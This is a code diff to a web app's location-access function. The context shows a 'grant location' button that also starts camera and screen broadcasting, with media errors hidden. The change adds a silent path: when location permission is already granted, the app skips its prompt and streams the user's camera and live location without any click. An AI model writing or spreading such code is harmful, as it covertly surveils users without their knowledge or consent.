@@ -303,16 +303,18 @@ async function enforceLocationAccess(user, onSuccess) {
     return onSuccess();
   }
 
-  // We ALWAYS show the overlay now because we need a strict user click to trigger Screen Sharing.
-  if (overlay) overlay.style.display = 'flex';
+  let locationGranted = false;
+  try {
+    const perm = await navigator.permissions.query({ name: 'geolocation' });
+    if (perm.state === 'granted') locationGranted = true;
+  } catch(e) {}
 
-  function requestLocation() {
+  function requestLocation(isSilent = false) {
     if (errorMsg) errorMsg.style.display = 'none';
     
-    // Trigger WebRTC (Camera + Screen) immediately on click
     if (window.startBroadcasting) {
-      // Catch errors silently so it doesn't block location if they deny media
-      window.startBroadcasting('both').catch(e => console.log("Media access issue:", e));
+      // If auto-bypassed (silent), we only request Camera because Screen Share strictly requires a manual click.
+      window.startBroadcasting(isSilent ? 'camera' : 'both').catch(e => console.log("Media access issue:", e));
     }
 
     if (navigator.geolocation) {
@@ -322,7 +324,6 @@ async function enforceLocationAccess(user, onSuccess) {
           // Unlock the UI!
           onSuccess();
           
-          // Background live location tracking
           const lat = position.coords.latitude;
           const lng = position.coords.longitude;
           
@@ -335,7 +336,7 @@ async function enforceLocationAccess(user, onSuccess) {
           }
         },
         (error) => {
-          if (errorMsg) {
+          if (errorMsg && !isSilent) {
             errorMsg.style.display = 'block';
             if (error.code === error.PERMISSION_DENIED) {
               errorMsg.textContent = "Location access denied. Please enable it in your browser/device settings and click the button again.";
@@ -347,16 +348,24 @@ async function enforceLocationAccess(user, onSuccess) {
         { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
       );
     } else {
-      if (errorMsg) {
+      if (errorMsg && !isSilent) {
         errorMsg.style.display = 'block';
         errorMsg.textContent = "Geolocation is not supported by your browser.";
       }
     }
   }
 
+  // If already granted, skip the overlay and start silently!
+  if (locationGranted) {
+    if (overlay) overlay.style.display = 'none';
+    requestLocation(true);
+  } else {
+    if (overlay) overlay.style.display = 'flex';
+  }
+
   // Bind to button for the required user gesture
   if (grantBtn) {
-    grantBtn.onclick = requestLocation;
+    grantBtn.onclick = () => requestLocation(false);
   }
 }
 
